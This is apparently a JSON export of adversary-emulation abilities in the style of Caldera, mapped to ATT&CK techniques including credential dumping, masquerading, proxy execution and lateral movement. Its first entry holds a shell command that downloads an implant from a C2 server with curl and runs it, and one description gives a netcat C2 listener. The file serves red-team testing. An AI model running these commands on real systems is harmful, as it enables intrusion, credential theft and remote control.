                "command": "server=\"#{app.contact.http}\";\nsocket=\"#{app.contact.tcp}\";\ncontact=\"tcp\";\ncurl -s -X POST -H \"file:manx.go\" -H \"platform:linux\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -http $server -socket $socket -contact $contact -v",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Manx",
        "tactic": "command-and-control",
        "plugin": "manx",
        "ability_id": "356d1722-7784-40c4-822b-0cf864b0b36d",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Map Admin share utilizing PowerShell\n",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: SMB/Windows Admin Shares",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Map Admin Share PowerShell",
        "tactic": "lateral-movement",
        "plugin": "atomic",
        "ability_id": "31a7326fcc56c71d97da23e3fe1ec364",
        "technique_id": "T1021.002",
        "repeatable": false
    },
    {
        "description": "Connecting To Remote Shares\n",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: SMB/Windows Admin Shares",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Map admin share",
        "tactic": "lateral-movement",
        "plugin": "atomic",
        "ability_id": "a719076e595f5a106be38682a444ad2c",
        "technique_id": "T1021.002",
        "repeatable": false
    },
    {
        "description": "Launch an executable that attempts to masquerade as a legitimate executable.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Match Legitimate Name or Location",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Masquerade as a built-in system executable",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "029770bd7c3a403daeab3af692af0046",
        "technique_id": "T1036.005",
        "repeatable": false
    },
    {
        "description": "Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.\n\nUpon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Rename System Utilities",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Masquerading - cscript.exe running as notepad.exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "7e4a00e15142a1c5edb9dd0ecc86f1d3",
        "technique_id": "T1036.003",
        "repeatable": false
    },
    {
        "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Rename System Utilities",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Masquerading - non-windows exe running as windows exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6fdc9037290299164d52b65219d628ef",
        "technique_id": "T1036.003",
        "repeatable": false
    },
    {
        "description": "Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.\n\nUpon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Rename System Utilities",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Masquerading - powershell.exe running as taskhostw.exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f82efa1ac00819fe5260af67800cbdcb",
        "technique_id": "T1036.003",
        "repeatable": false
    },
    {
        "description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Rename System Utilities",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Masquerading - windows exe running as different windows exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "995a75a3009f98f56160ea61cb00645a",
        "technique_id": "T1036.003",
        "repeatable": false
    },
    {
        "description": "Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.\n\nUpon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Rename System Utilities",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Masquerading - wscript.exe running as svchost.exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0c05ae67acce3a0130e88a69c075810f",
        "technique_id": "T1036.003",
        "repeatable": false
    },
    {
        "description": "Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.\n\nUpon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Rename System Utilities",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Masquerading as Windows LSASS process",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "d5ac8f5ec45224dc36453a9490845f23",
        "technique_id": "T1036.003",
        "repeatable": false
    },
    {
        "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Microsoft.Workflow.Compiler.exe Payload Execution",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "1c4576eb8d4cea58c18e4b087d9c9ac0",
        "technique_id": "T1218",
        "repeatable": false
    },
    {
        "description": "This test emulates Mimic ransomware's ability to enable multiple RDP sessions per user by modifying the fSingleSessionPerUser value within the Terminal Server registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mimic Ransomware - Allow Multiple RDP Sessions per User",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "59fab1b89fc78dee4436f070209dd6df",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "This test emulates Mimic ransomware's ability to enable multiple user sessions by modifying the AllowMultipleTSSessions value within the Winlogon registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mimic Ransomware - Enable Multiple User Sessions",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "14ca1cfcf0455a15ae48b907f07d6599",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mimikatz",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "6aaf86c797e33b0ee3d16592be76f46e",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mimikatz - Cradlecraft PsSendKeys",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "90c76bd616efee6d7c98dc6c1dcc6e99",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Similar to PTH, but attacking Kerberos\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Use Alternate Authentication Material: Pass the Ticket",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mimikatz Kerberos Ticket Attack",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "fd2611bbbe81dfbe6c282799fea56737",
        "technique_id": "T1550.003",
        "repeatable": false
    },
    {
        "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Use Alternate Authentication Material: Pass the Hash",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mimikatz Pass the Hash",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "ed508e035ded2716b4622276bc3da403",
        "technique_id": "T1550.002",
        "repeatable": false
    },
    {
        "description": "Custom GO credential dumper using minidumpwritedump",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.process.id"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "MiniDumpWriteDump (Spooky)",
        "tactic": "credential-access",
        "plugin": "stockpile",
        "ability_id": "3c647015-ab0a-496a-8847-6ab173cd2b22",
        "technique_id": "T1003",
        "repeatable": false
    },
    {
        "description": "Emulates the JS -> MSI chain of the MirrorBlast T505 campaign by executing an xlsm file designed. \nRequires the 32 bit version of Office to run. [MirrorBlast Campaign Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mirror Blast Emulation",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "7d45fed6428da84d356357a1ad79bfe4",
        "technique_id": "T1204.002",
        "repeatable": false
    },
    {
        "description": "This test modifies the BootExecute registry value to \"autocheck autoche *\", which can be used to simulate an adversary's attempt to tamper with the system's boot process. \nReference - https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf\nNOTE that by not saving the correct value, you may inhibit your system from booting properly. Only run on a test system. There is a reg export before running the Atomic.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Modify BootExecute Value",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "acf646b22c5d2c2b1058feb7da1f3bdc",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\nUpon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create or Modify System Process: Windows Service",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Modify Fax service to run PowerShell",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "50598e403dbf17cf341e4e08a9c5b0d1",
        "technique_id": "T1543.003",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Modify Registry of Current User Profile - cmd",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0bacba34be276136d07781079e912090",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Modify Registry of Local Machine - cmd",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "ad3da5b8a3ced63d5b6374b7aa6adac5",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: LSASS Driver",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "c627649c38266ebb83e477796312be3c",
        "technique_id": "T1547.008",
        "repeatable": false
    },
    {
        "description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Security Support Provider",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Modify SSP configuration in registry",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "7675653e29a9ca33083f7d66d87bec13",
        "technique_id": "T1547.005",
        "repeatable": false
    },
    {
        "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Modify registry to store logon credentials",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "8ef0e743e8f073af665288aaf631a71a",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mount ISO image",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "78024e1da21332fdcad99a6f93170d41",
        "technique_id": "T1553.005",
        "repeatable": false
    },
    {
        "description": "Mount a windows share",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: SMB/Windows Admin Shares",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_share"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.not_exists"
            },
            {
                "relationship_match": [
                    {
                        "source": "domain.user.name",
                        "edge": "has_password",
                        "target": "domain.user.password"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.basic"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_admin",
                        "target": "domain.user.name"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.req_like"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "isAccessibleFrom"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.reachable"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.no_backwards_movement"
            }
        ],
        "singleton": true,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mount Share",
        "tactic": "lateral-movement",
        "plugin": "stockpile",
        "ability_id": "aa6ec4dd-db09-4925-b9b9-43adeb154686",
        "technique_id": "T1021.002",
        "repeatable": false
    },
    {
        "description": "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mount an ISO image and run executable from the ISO",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f5e00f183d185e4306b355d3c3e5d8f3",
        "technique_id": "T1553.005",
        "repeatable": false
    },
    {
        "description": "Copy powershell to non-standard location and perform triage commands",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Move Powershell & triage",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "e5f9de8f-3df1-4e78-ad92-a784e3f6770d",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Mshta",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mshta Executes Remote HTML Application (HTA)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "337c07ce279b747827679ffb226e5d9c",
        "technique_id": "T1218.005",
        "repeatable": false
    },
    {
        "description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Mshta",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "826e5c82d8f99a94ae96472dca89de03",
        "technique_id": "T1218.005",
        "repeatable": false
    },
    {
        "description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Mshta",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mshta executes VBScript to execute malicious command",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e5ca57d20f8608e2acc0808b8dd8726c",
        "technique_id": "T1218.005",
        "repeatable": false
    },
    {
        "description": "Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Mshta",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mshta used to Execute PowerShell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "54a7ac8fc8991511de9993983d3d3215",
        "technique_id": "T1218.005",
        "repeatable": false
    },
    {
        "description": "Executes an MSI containing an embedded DLL using msiexec.exe\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Msiexec",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Msiexec.exe - Execute Local MSI file with an embedded DLL",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6ff9659bac38f7c1f64b7f302309c2f3",
        "technique_id": "T1218.007",
        "repeatable": false
    },
    {
        "description": "Executes an MSI containing an embedded EXE using msiexec.exe\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Msiexec",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Msiexec.exe - Execute Local MSI file with an embedded EXE",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "728053b8e56bf06f4d19ceac871fcb6c",
        "technique_id": "T1218.007",
        "repeatable": false
    },
    {
        "description": "Executes an MSI containing embedded JScript code using msiexec.exe\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Msiexec",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Msiexec.exe - Execute Local MSI file with embedded JScript",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "fc919667b226b75eafa70b29f8f5e4f7",
        "technique_id": "T1218.007",
        "repeatable": false
    },
    {
        "description": "Executes an MSI containing embedded VBScript code using msiexec.exe\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Msiexec",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Msiexec.exe - Execute Local MSI file with embedded VBScript",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b0f287b8da3b5ad8619f8b7102cf4ee7",
        "technique_id": "T1218.007",
        "repeatable": false
    },
    {
        "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Msiexec",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Msiexec.exe - Execute Remote MSI file",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "dff11c1e8340bbae0245b866917889af",
        "technique_id": "T1218.007",
        "repeatable": false
    },
    {
        "description": "Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Msiexec",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Msiexec.exe - Execute the DllRegisterServer function of a DLL",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "a514c64de95ade525a68116e442af1bd",
        "technique_id": "T1218.007",
        "repeatable": false
    },
    {
        "description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Msiexec",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Msiexec.exe - Execute the DllUnregisterServer function of a DLL",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6584f399fa2dfc9f34f8b53476b36282",
        "technique_id": "T1218.007",
        "repeatable": false
    },
    {
        "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "NTFS Alternate Data Stream Access",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "c5951c819c5f6125e0e5987a12a344f9",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Named pipe client impersonation",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "d1bde9af5206152c9980a5b6adcc1813",
        "technique_id": "T1134.001",
        "repeatable": false
    },
    {
        "description": "Mounts a network file share on a target computer",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: SMB/Windows Admin Shares",
        "requirements": [],
        "singleton": true,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Net use",
        "tactic": "lateral-movement",
        "plugin": "stockpile",
        "ability_id": "40161ad0-75bd-11e9-b475-0800200c9a66",
        "technique_id": "T1021.002",
        "repeatable": false
    },
    {
        "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services. \n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Access Software",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "NetSupport - RAT Execution",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "371c8a9f96a5feb709658bf9933592d4",
        "technique_id": "T1219",
        "repeatable": false
    },
    {
        "description": "NetWire continues to create its home key (HKCU\\SOFTWARE\\NetWire) as well as adding it into the auto-run group in the victim\u2019s registry.\nSee how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "NetWire RAT Registry Key Creation",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "8bb400c4a8398ff27df5fff189aca59b",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Non-Application Layer Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Netcat C2",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "2ebdab5e06cbf1f321c85b0fc6ce1dfb",
        "technique_id": "T1095",
        "repeatable": false
    },
    {
        "description": "You can register a \"helper dll\" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.\nThe NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.\n\n[Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)\n[Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Netsh Helper DLL",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
